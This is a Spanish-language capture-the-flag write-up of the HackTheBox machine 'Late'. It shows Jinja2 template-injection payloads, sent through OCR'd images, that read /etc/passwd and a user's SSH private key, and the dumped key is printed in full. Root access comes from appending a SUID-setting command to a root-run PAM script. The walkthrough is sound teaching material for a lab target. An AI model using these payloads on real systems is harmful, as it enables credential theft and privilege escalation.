---
title: WriteUp Late HTB
author: rabb1t
date: 2022-07-30
categories: [HackTheBox, WriteUp, Machines, Linux]
tags: [SSTI, flask, lsattr, chattr, tesseract, jinja2]
math: false
mermaid: false
image:
  path: https://www.hackthebox.com/storage/avatars/a9b92307fbcfa1472607067909a2bccf.png
  width: 180
  height: 180
---
## Índice
- [Información básica de la máquina](#máquina-late)
- [Herramientas y recursos empleados](#herramientas-y-recursos-empleados)
- [Enumeración](#enumeración)
- [Explotando la vulnerabilidad SSTI](#explotando-la-vulnerabilidad-ssti)
- [Escalando privilegios](#escalando-privilegios)
	- [Transición de archivos](#transición-de-archivos)
	- [Analizando posible vector](#analizando-posible-vector)

## Máquina Late

| IP     	   |10.10.11.156|
|--------------|------------|
| OS		   | Linux	    |
| Dificultad   | Fácil      |
| Creador	   | kavigihan	|

## Herramientas y recursos empleados
- Herramientas
	- nmap
	- whatweb
	- [pspy](https://github.com/DominicBreuker/pspy)
	- [linpeas](https://github.com/topics/linpeas)
- Recursos
	- [AllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

------

## Enumeración
Iniciamos con un escaneo de todos los puertos abiertos y la detección de servicios para los mismos:
```shell
Nmap 7.92 scan initiated Sun Jul 24 16:38:43 2022 as: nmap -p- --open -sCV -sS --min-rate 5000 -Pn -vvv -n -oN scope.txt 10.10.11.156
Nmap scan report for 10.10.11.156
Not shown: 52025 filtered tcp ports (no-response), 13508 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDSqIcUZeMzG+QAl/4uYzsU98davIPkVzDmzTPOmMONUsYleBjGVwAyLHsZHhgsJqM9lmxXkb8hT4ZTTa1azg4JsLwX1xKa8m+RnXwJ1DibEMNAO0vzaEBMsOOhFRwm5IcoDR0gOONsYYfz18pafMpaocitjw8mURa+YeY21EpF6cKSOCjkVWa6yB+GT8mOcTZOZStRXYosrOqz5w7hG+20RY8OYwBXJ2Ags6HJz3sqsyT80FMoHeGAUmu+LUJnyrW5foozKgxXhyOPszMvqosbrcrsG3ic3yhjSYKWCJO/Oxc76WUdUAlcGxbtD9U5jL+LY2ZCOPva1+/kznK8FhQN
|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBBMen7Mjv8J63UQbISZ3Yju+a8dgXFwVLgKeTxgRc7W+k33OZaOqWBctKs8hIbaOehzMRsU7ugP6zIvYb25Kylw=
|   256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIIGrWbMoMH87K09rDrkUvPUJ/ZpNAwHiUB66a/FKHWrj
80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 1575FDF0E164C3DB0739CF05D9315BDF
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Late - Best online image tools
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Hay dos puertos abiertos, el 22 (SSH) y el 80 (HTTP). De momento no contamos con credenciales para iniciar sesión por SSH así que proseguimos a enumerar el sitio web, inicialmente usando la herramienta `whatweb`:
```shell
rabb1t@hold:~$ whatweb http://10.10.11.156
http://10.10.11.156 [200 OK] Bootstrap[3.0.0], Country[RESERVED][ZZ], Email[\#,support@late.htb], Google-API[ajax/libs/jquery/1.10.2/jquery.min.js], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.156], JQuery[1.10.2], Meta-Author[Sergey Pozhilov (GetTemplate.com)], Script, Title[Late - Best online image tools], nginx[1.14.0]
```

La versión de _JQuery_ es antigua, podríamos intentar el ataque de _prototype pollution_. De momento, vamos a visualizar la página en el navegador:
![Web Late](/assets/favicon/2022-07-30/late1.png)

_Home_, _Contact_ y _MORE INFO_, nos llevan a la misma página, no tenemos nada para jugar (campos de entrada); sin embargo, más abajo en la misma página podemos ver un subdominio:
![Web subdomain Late](/assets/favicon/2022-07-30/late2.png)

__late free online photo editor__ nos lleva a `images.late.htb`, procedemos a agregar el subdominio al `/etc/hosts` para que el navegador sepa resolver. Vemos que nos redirige a una página en la cual podemos subir una imagen para leer el texto de la imagen y guardarlo en un archivo. Además, muestra que está empleando `flask`:
![Subdomain images.late.htb](/assets/favicon/2022-07-30/late3.png)

{% assign ssti = "{{7*7}}" %}
## Explotando la vulnerabilidad SSTI
¿Qué vulnerabilidad podríamos intentar en este caso? Por supuesto, podríamos intentar la vulnerabilidad SSTI. Intentemos subir una imagen de prueba con {{ ssti }} (Hay otros test que se pueden usar para comprobar si es vulnerable):

![Test SSTI](/assets/favicon/2022-07-30/test_ssti.png)

Al subir la imagen y escanearla, nos descarga un archivo llamado `results.txt` en el que aparece el texto de la imagen, pero en este caso ha sido interpretado el código. Abrimos el archivo y aparece `<p>49</p>`, de esta forma queda testeado que es vulnerable. 

Probemos un payload de [AllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2). En mi caso usaré el siguiente para ver los usuarios del sistema:

{% assign ssti = '{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}' %}
```shell
{{ ssti }}
```
(Recordemos tomarle una captura de pantalla para subirlo. Además, puede que no salga a la primera porque podría no leer bien las letras, en ese caso es bueno probar ampliando el rango en que se toma la foto).

La respuesta del servidor es nuevamente el archivo `results.txt`. En este caso vemos el archivo `/etc/passwd` y hay dos usuarios que tienen shell: el usuario `svc_acc` y `root`. Sabiendo lo anterior, ahora podemos leer la `id_rsa` del usuario `svc_acc` para intentar conectarnos por SSH; por lo que, nuevamente usaré el payload anterior, cambiando la ruta y hacer un pantallazo de:
{% assign ssti = '{{ get_flashed_messages.__globals__.__builtins__.open("/home/scv_acc/.ssh/id_rsa").read() }}' %}
```shell
{{ ssti }}
```

...para subirlo y obtener la clave privada. Ahora movemos el archivo con la clave privada a nuestro directorio de trabajo y le quitamos las etiquetas `<p></p>` , además le damos permisos `600`:
```shell
rabb1t@hold:~$ mv ~/Downloads/results.txt id_rsa; 
rabb1t@hold:~$ sed -i 's/<p>//' id_rsa
rabb1t@hold:~$ sed -i 's/<\/p>//' id_rsa
rabb1t@hold:~$ chmod 600 id_rsa
rabb1t@hold:~$ cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAqe5XWFKVqleCyfzPo4HsfRR8uF/P/3Tn+fiAUHhnGvBBAyrM
HiP3S/DnqdIH2uqTXdPk4eGdXynzMnFRzbYb+cBa+R8T/nTa3PSuR9tkiqhXTaEO
bgjRSynr2NuDWPQhX8OmhAKdJhZfErZUcbxiuncrKnoClZLQ6ZZDaNTtTUwpUaMi
/mtaHzLID1KTl+dUFsLQYmdRUA639xkz1YvDF5ObIDoeHgOU7rZV4TqA6s6gI7W7
d137M3Oi2WTWRBzcWTAMwfSJ2cEttvS/AnE/B2Eelj1shYUZuPyIoLhSMicGnhB7
7IKpZeQ+MgksRcHJ5fJ2hvTu/T3yL9tggf9DsQIDAQABAoIBAHCBinbBhrGW6tLM
fLSmimptq/1uAgoB3qxTaLDeZnUhaAmuxiGWcl5nCxoWInlAIX1XkwwyEb01yvw0
ppJp5a+/OPwDJXus5lKv9MtCaBidR9/vp9wWHmuDP9D91MKKL6Z1pMN175GN8jgz
W0lKDpuh1oRy708UOxjMEalQgCRSGkJYDpM4pJkk/c7aHYw6GQKhoN1en/7I50IZ
uFB4CzS1bgAglNb7Y1bCJ913F5oWs0dvN5ezQ28gy92pGfNIJrk3cxO33SD9CCwC
T9KJxoUhuoCuMs00PxtJMymaHvOkDYSXOyHHHPSlIJl2ZezXZMFswHhnWGuNe9IH
Ql49ezkCgYEA0OTVbOT/EivAuu+QPaLvC0N8GEtn7uOPu9j1HjAvuOhom6K4troi
WEBJ3pvIsrUlLd9J3cY7ciRxnbanN/Qt9rHDu9Mc+W5DQAQGPWFxk4bM7Zxnb7Ng
Hr4+hcK+SYNn5fCX5qjmzE6c/5+sbQ20jhl20kxVT26MvoAB9+I1ku8CgYEA0EA7
t4UB/PaoU0+kz1dNDEyNamSe5mXh/Hc/mX9cj5cQFABN9lBTcmfZ5R6I0ifXpZuq
0xEKNYA3HS5qvOI3dHj6O4JZBDUzCgZFmlI5fslxLtl57WnlwSCGHLdP/knKxHIE
uJBIk0KSZBeT8F7IfUukZjCYO0y4HtDP3DUqE18CgYBgI5EeRt4lrMFMx4io9V3y
3yIzxDCXP2AdYiKdvCuafEv4pRFB97RqzVux+hyKMthjnkpOqTcetysbHL8k/1pQ
GUwuG2FQYrDMu41rnnc5IGccTElGnVV1kLURtqkBCFs+9lXSsJVYHi4fb4tZvV8F
ry6CZuM0ZXqdCijdvtxNPQKBgQC7F1oPEAGvP/INltncJPRlfkj2MpvHJfUXGhMb
Vh7UKcUaEwP3rEar270YaIxHMeA9OlMH+KERW7UoFFF0jE+B5kX5PKu4agsGkIfr
kr9wto1mp58wuhjdntid59qH+8edIUo4ffeVxRM7tSsFokHAvzpdTH8Xl1864CI+
Fc1NRQKBgQDNiTT446GIijU7XiJEwhOec2m4ykdnrSVb45Y6HKD9VS6vGeOF1oAL
K6+2ZlpmytN3RiR9UDJ4kjMjhJAiC7RBetZOor6CBKg20XA1oXS7o1eOdyc/jSk0
kxruFUgLHh7nEx/5/0r8gmcoCvFn98wvUPSNrgDJ25mnwYI0zzDrEw==
-----END RSA PRIVATE KEY-----
rabb1t@hold:~$ ssh -i id_rsa scv_acc@10.10.11.156
```

## Escalando privilegios
### Transición de archivos
Descargamos [linpeas](https://github.com/topics/linpeas) y [pspy](https://github.com/DominicBreuker/pspy)
Movemos los archivos a nuestros directorios de trabajo y creamos un servidor por http:
```shell
rabb1t@hold:~$ mv ~/Downloads/pspy pspy
rabb1t@hold:~$ mv ~/Dowloads/linpeas.sh
rabb1t@hold:~$ python3 -m http.server 80
```

Y en la máquina víctima:
```shell
svc_acc@late:~$ wget http://10.10.16.28/pspy
svc_acc@late:~$ wget http://10.10.16.28/linpeas.sh
svc_acc@late:~$ chmod 700 pspy; chmod 700 linpeas.sh
```

### Analizando posible vector
Ahora podemos usar `linpeas` o `pspy` para ver si hay algo de lo que nos podamos aprovechar para escalar privilegios. Ejecutando `linpeas` en la máquina víctima, nos aparece este archivo que podemos modificar, además tiene la extensión `.sh`:
```shell
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
You own the script: /usr/local/sbin/ssh-alert.sh
```

Veamos qué tiene el archivo:
```shell
svc_acc@late:~$ cat /usr/local/sbin/ssh-alert.sh 
#!/bin/bash
RECIPIENT="root@late.htb"
SUBJECT="Email from Server Login: SSH Alert"
BODY="
	A SSH login was detected.
    User:        $PAM_USER
    User IP Host: $PAM_RHOST
    Service:     $PAM_SERVICE
    TTY:         $PAM_TTY
    Date:        `date`
    Server:      `uname -a`
"
if [ ${PAM_TYPE} = "open_session" ]; then
    echo "Subject:${SUBJECT} ${BODY}" | /usr/sbin/sendmail ${RECIPIENT}
fi
```
Si ejecutamos `pspy` (también en la máquina víctima) vemos que el archivo en el que podemos "escribir". Constantemente el usuario `root` lo esta copiando y nos asigna como propietarios del mismo:
```shell
CMD: UID=0    PID=29874  | /bin/bash /root/scripts/cron.sh 
CMD: UID=0    PID=29873  | /bin/sh -c /root/scripts/cron.sh 
CMD: UID=0    PID=29872  | /usr/sbin/CRON -f 
CMD: UID=0    PID=29877  | cp /root/scripts/ssh-alert.sh /usr/local/sbin/ssh-alert.sh 
CMD: UID=0    PID=29879  | chown svc_acc:svc_acc /usr/local/sbin/ssh-alert.sh 
CMD: UID=0    PID=29885  | /bin/bash /root/scripts/cron.sh 
CMD: UID=0    PID=29884  | /bin/sh -c /root/scripts/cron.sh 
CMD: UID=0    PID=29883  | /usr/sbin/CRON -f 
CMD: UID=0    PID=29890  | chown svc_acc:svc_acc /usr/local/sbin/ssh-alert.sh
```

Analizando el script, entendemos que envía un correo con ciertas especifícaciones cuando iniciamos sesión por SSH gracias al control `PAM` (nos podría sacar a patadas si ven algo inusual en los inicios de sesión...) 

Ahora ¿Cómo sabemos que el script se está ejecutando? Bueno, podemos revisar algunos archivos de configuración (`.bashrc`, `.profile`, `/etc`) o buscar el texto `/usr/local/sbin/ssh-alert.sh` de forma recursiva con grep para saber desde dónde se está ejecutando, de la siguiente forma:
```shell
svc_acc@late:~$ grep -r '/usr/local/sib/ssh-alert.sh' / 2>/dev/null
session required pam_exec.so /usr/local/sbin/ssh-alert.sh
```

Podemos ver que está en el archivo `/etc/pam.d/sshd`; por lo que, ya podemos darnos a la idea de que se está ejecutando cada vez que iniciamos sesión por SSH.

Ahora veamos los permisos de `ssh-alert.sh`:
```shell
svc_acc@late:/usr/local/sbin$ ls -la
total 12
drwxr-xr-x  2 svc_acc svc_acc 4096 Jul 29 16:20 .
drwxr-xr-x 10 root    root    4096 Aug  6  2020 ..
-rwxr-xr-x  1 svc_acc svc_acc  433 Jul 29 16:20 ssh-alert.sh

svc_acc@late:/usr/local/sbin$ lsattr ssh-alert.sh 
-----a--------e--- ssh-alert.sh
```

Aparentemente tenemos permisos de escritura `-rwxr-xr-x`, sin embargo listando los atributos del archivo, podemos ver que tiene la letra `a`, esto quiere decir que no podemos modificar nada de lo que tiene un archivo. Aún así, al script se le puede agregar nueva información. Si quisieramos convertirnos en root podríamos hacer lo siguiente:
```shell
svc_acc@late:/usr/local/sbin$ echo 'chmod u+s /bin/bash' >> /usr/local/sbin/ssh-alert.sh
```

Escribimos en el archivo (`ssh-alert`) que queremos darle permisos `SUID` al binario `/bin/bash`
Salimos de la sesión y volvemos a iniciar con el mismo usuario:
```shell
svc_acc@late:/usr/local/sbin$ exit
Connection to 10.10.11.156 closed

rabb1t@hold:~$ ssh svc_acc@10.10.11.156 -i id_rsa

svc_acc@late:~$ bash-4.4$ /bin/bash -p
❯ bash-4.4\# whoami
root
```

Cuando iniciamos sesión, el código es interpretado, asigna el permiso dado a `/bin/bash`
Ejecutamos `/bin/bash` con permisos privilegiados (`-p`) y somos root :D.  

¡Happy Hacking!